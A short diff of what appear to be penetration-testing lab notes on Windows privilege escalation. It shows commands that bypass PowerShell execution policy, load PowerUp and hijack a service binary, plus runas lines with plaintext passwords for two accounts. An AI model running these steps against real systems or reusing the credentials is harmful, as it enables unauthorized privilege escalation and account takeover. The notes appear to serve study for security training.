@@ -54,7 +54,7 @@ When you gain access to a windows user do steps bellow:
       powershell -ep bypass
       . .\PowerUp.ps1
       Get-ModifiableServiceFile
-      Install-ServiceBinary -Name 'mysql'  #this command is going to fail because a bug in a parameter use os a cmdlet 
+      Install-ServiceBinary -Name 'mysql'  #this command is going to fail because there a bug in a parameter use on a cmdlet, but you can use powerup to enumerate and finish the process manually.
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
 runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
